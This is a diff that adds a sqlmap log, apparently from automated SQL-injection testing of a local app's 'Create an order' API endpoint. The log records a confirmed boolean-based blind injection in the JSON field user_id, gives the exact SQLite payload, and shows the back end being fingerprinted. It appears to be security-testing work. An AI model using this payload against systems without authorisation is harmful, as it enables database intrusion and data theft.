@@ -1,0 +1,29 @@
+        ___
+       __H__
+ ___ ___[']_____ ___ ___  {1.9.9.4#dev}
+|_ -| . [)]     | .'| . |
+|___|_  [)]_|_|_|__,|  _|
+      |_|V...       |_|   https://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting @ 15:17:44 /2025-09-26/
+
+[15:17:46] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap' as the output directory
+JSON data found in POST body. Do you want to process it? [Y/n/q] Y
+[15:17:46] [INFO] resuming back-end DBMS 'sqlite' 
+[15:17:46] [INFO] testing connection to the target URL
+sqlmap resumed the following injection point(s) from stored session:
+---
+Parameter: JSON user_id ((custom) POST)
+    Type: boolean-based blind
+    Title: SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)
+    Payload: {"user_id": "1 AND CASE WHEN 6288=6288 THEN 6288 ELSE JSON(CHAR(122,84,77,72)) END", "product_id": "1", "quantity": "1"}
+---
+[15:17:47] [INFO] the back-end DBMS is SQLite
+back-end DBMS: SQLite
+[15:17:47] [WARNING] on SQLite it is not possible to enumerate databases (use only '--tables')
+[15:17:47] [INFO] fetched data logged to text files under 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Create_an_order_sqlmap\localhost'
+
+[*] ending @ 15:17:47 /2025-09-26/
+
